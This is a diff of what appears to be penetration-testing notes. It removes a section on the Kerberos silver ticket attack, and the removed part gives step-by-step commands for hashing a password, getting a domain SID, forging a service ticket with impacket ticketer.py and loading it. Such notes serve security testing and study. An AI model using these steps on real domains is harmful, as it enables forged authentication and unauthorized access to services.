@@ -192,32 +192,6 @@ Use the `-k` option as well as `-dc-host` instead of `-dc-ip`. As the latter wil
 - [https://www.crowdstrike.com/cybersecurity-101/kerberoasting/](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)
 
 
-## Silver ticket attack
-A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.      
-**[https://www.crowdstrike.com/cybersecurity-101/attack-types/silver-ticket-attack/](https://www.crowdstrike.com/cybersecurity-101/attack-types/silver-ticket-attack/)**
-
-
-### Steps
-1. Generate NTLM hash
-    ```bash
-    iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
-    ```
-2. Get Domain SID
-    *Use impacket-getPac*
-    ```bash
-    getPac.py -targetUser <username> <domain>/<username>:<password>
-    ```
-3. Generate ticket
-    *Use impacket-ticketer*
-    ```bash
-    ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain <domain> -dc-ip <ip> -spn <service_spn> <username>
-    ```
-4. Add the ticket location to `KRB5CCNAME`
-    ```bash
-    KRB5CCNAME=<username>.ccache klist
-    ```
-
-
 
 # RPC
 ## Enumeration
